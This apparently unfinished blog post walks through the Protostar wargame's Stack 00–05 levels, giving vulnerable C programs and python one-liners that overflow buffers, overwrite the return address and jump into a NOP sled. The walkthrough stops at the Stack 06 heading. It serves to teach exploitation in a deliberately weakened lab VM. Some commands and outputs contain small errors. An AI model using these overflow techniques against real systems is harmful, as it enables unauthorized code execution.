---
comments: true
date: 2015-02-16T00:00:00Z
draft: true
image:
  credit: null
  creditlink: null
  feature: null
modified: 2015-02-16 14:46:38 +0000
share: null
tags:
- protostar
- exploit exercises
- exploits
- hacking games
- wargames
title: Cracking Protostar Part 1
url: /2015/02/16/cracking-protostar-part-1/
---

It's been a while since I posted about [cracking Nebula](http://unlogic.co.uk/2014/06/24/cracking-nebula-part1/) so why
not carry on with cracking [Protostar](https://exploit-exercises.com/protostar)? Download it from the [Exploit
Exercises download page](http://www.exploit-exercises.com/download) and boot up the VM.

We need to remember that this VM has no Address Space Layout Randomisation and
Non-Executable memory has been disabled, as this will affect how the programs behave.

Change to `/opt/protostar/bin` and let's get our thinking hats on.

<section id="table-of-contents" class="toc">
<header>
<h3>Contents</h3>
</header>
<div id="drawer" markdown="1">
*  Auto generated table of contents
{:toc}
</div>
</section><!-- /#table-of-contents -->

## Stack 00 ##

> This level introduces the concept that memory can be accessed outside of its 
> allocated region, how the stack variables are laid out, and that modifying 
> outside of the allocated memory can modify program execution.

{{< highlight C >}}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
{{< / highlight >}}

Bearing in mind that ASLR is off this is fairly straight foward and a nice introduction
to explaining how things are allocated on the stack. `modified` and `buffer` are both
allocated on the stack as opposed to the heap. With the stack being a stack, items 
that are added last are on top of those already on the stack. That is, with ASLR off,
`modified` is right at, or near to, the end of `buffer`s memory. As we can control what 
we write into `buffer`, and there's no checks, we can overflow `buffer` and therefore
overwrite `modified`.

{{< highlight console >}}
protostar:/opt/protostar/bin$ python -c 'print "a"*65' | ./stack0
you have changed the 'modified' variable
{{< / highlight >}}

## Stack 01 ##

> This level looks at the concept of modifying variables to specific values 
> in the program, and how the variables are laid out in memory.

{{< highlight C >}}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
{{< / highlight >}}

This is similar to the `stack 00` but this time we need to write a specific value into
`modified`. The values are the ASCII codes for *abcd*. So let's try that

{{< highlight console >}}
protostar:/opt/protostar/bin$ ./stack1 `python -c 'print "a"*65 + "abcd"'`
Try again, you got 0x64636261
{{< / highlight >}}

Can you tell why this happened? The problem statement mentions the issue: *litte endian*
All we need to do it reverse the string

{{< highlight console >}}
protostar:/opt/protostar/bin$ ./stack1 `python -c 'print "a"*65 + "dcba"'`
you have correctly got the variable to the the right value
{{< / highlight >}}

# Stack 02 #

> Stack2 looks at environment variables, and how they can be set.

{{< highlight C >}}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
{{< / highlight >}}

This is another variation of what we have already done, except now we feed the input
into the program via the environment. It wants a specific value, which we'll provide
using python again.

{{< highlight console >}}
protostar:/opt/protostar/bin$ export GREENIE=`python -c 'print "a"*64+"\x0a\x0d\x0a\x0d"'`
protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable
{{< / highlight >}}

# Stack 03 #

> Stack3 looks at environment variables, and how they can be set, and 
> overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

{{< highlight C >}}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
{{< / highlight >}}

This again is similar to all the prvious stack examples. This time however we
need to figure out what to write into `fp`. `fp` is a function pointer and it's
our job to make it point to the `win` function. First let's determine where in memory
this function lives. We are told that `objdump` and `gdb` can help us here, so let's make
use of that information.

{{< highlight console >}}
protostar:/opt/protostar/bin$ objdump -d ./stack3 | grep win
08048424 <win>:
protostar:/opt/protostar/bin$ python -c 'print "a"*64 + "\x24\x84\x04\x08"' | ./stack3
calling function pointer, jumping to 0x0080848424
code flow successfully changed
{{< / highlight >}}

`objdump -d` disassembles the code, and we `grep` for the `win` function. This gives us
the address of `win`. Using the previous technique we pipe our special string into
`stack3` and are greeted with success.

# Stack 04 #
> Stack4 takes a look at overwriting saved EIP and standard buffer overflows.

{{< highlight C >}}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
{{< / highlight >}}

Things are different here. We no longer have a variable on the stack that we
can overwrite, instead we need to overwrite EIP directly. EIP is the instruction
pointer and points to the location of the next instruction that needs to be
executed. So we need to overwrite it with the address of the `win` function. Doing
what we did above, we determine `win`'s address to be: `080483f4`.

We don't know how much we need to overflow `buffer` by in order to write into EIP,
so let's experiment. Normally I'd use a pattern like that from metasploit or my
[generator](https://github.com/Svenito/exploit-pattern), but we're limited to
what's on the box, so we'll need to do a little leg work. First I'm going to 
overflow the buffer and then pass a repeating sequence of 4 values to see if that
overwrites EIP.

{{< highlight console >}}
protostar:/opt/protostar/bin$ python -c 'print "a"*64+"\x01\x02\x03\x04"*20' > /tmp/stack4data
protostar:/opt/protostar/bin$ gdb ./stack4
(gdb) r < /tmp/stack4data
Starting program: /opt/protostar/bin/stack4 < /tmp/stack4data

Program received a signal SIGSEV, Segmentation fault.
0x04030201 in ?? ()
{{< / highlight >}}

That will do. We can cleanly set EIP as we need. All we need to do is change the payload

{{< highlight console >}}
protostar:/opt/protostar/bin$ python -c 'print "a"*64+"\xf4\x83\x04\x08"*20' > /tmp/stack4data
protostar:/opt/protostar/bin$ ./stack4 < /tmp/stack4data
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
code flow successfully changed
Illegal instruction
{{< / highlight >}}

What happened here? Well, we overwrote so much of the stack that it kept returning to the
`win` function. If we only add 4 copies of the address at the end of the payload we get one 
print out and a SIGSEV. This is because EIP is 0. If we want to be clean, we could also 
overwrite that with a valid return address by appending it to payload. For the purposes of
what this exercise is supposed to demonstrate, I'm satisfied with the outcome for
the purpose of this post. If you feel like it, try to make it exit cleanly.

# Stack 05 #
> Stack5 is a standard buffer overflow, this time introducing shellcode.

{{< highlight C >}}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
{{< / highlight >}}
 
Shellcode time! Actually, I'm not actually going to use a real shell code, I'm
going to use the debug trap instruction `\xcc` to make sure it works. Running 
actual shellcode will be an exercise for the reader.

What we need to do however is put our shellcode into buffer, then write the address
of buffer into EIP, so that after the `gets`, the next instruction is the start of
the shell code. This is a bit of a hit an miss exercise due to the fact that we 
get the address of `buffer` from within gdb. This causes a sligh shift in address locations
when run outside of gdb, but we'll offset the actual address, give ourselves an
adequate nop sled and get the job done. We'll know we've hit our target when we
see `Trace/breakpoint trap` in the output.

Using gdb to get the address of `buffer`:
{{< highlight console >}}
(gdb) break main
Breakpoint 1 at 0x80483cd: file stack5/stack5.c, line 10.
(gdb) r
Starting program: /opt/protostar/bin/stack5

Breakpoint 1, main (argc=1, argv=0xbffff874) at stack5/stack5.c:10
10      stack5/stack5.c: No such file or directory.
        in stack5/stack5.c
(gdb) x/x buffer
0xbffff7d8:     0bffff87c
(gdb)
{{< / highlight >}}

So `buffer` will be somewhere before `0xbffff7d8`. I went for `0xbffff7cc`.
Generate the overflow:
{{< highlight console >}}
protostar:/opt/protostar/bin$ python -c 'print "\x90"*30+"\xcc"*34'+"\xcc\xf7\xff\xbf"' > /tmp/stack5data
protostar:/opt/protostar/bin$ ./stack5 < /tmp/stack5data
Trace/breakpoint trap
{{< / highlight >}}

We hit the `int3`. You can see that we still need to fill the buffer with 64 chars, 30 of which
are the nop sled (`0x90`) and the rest if the *shellcode*. In theory we can just put the shellcode at
the very end and have the nop sled fill the rest, but you get the idea. The last bit is the little
endian address that should drop us somewhere into the nopsled, allowing for the difference in memory layout
when not running it through gdb.

# Stack 06 #
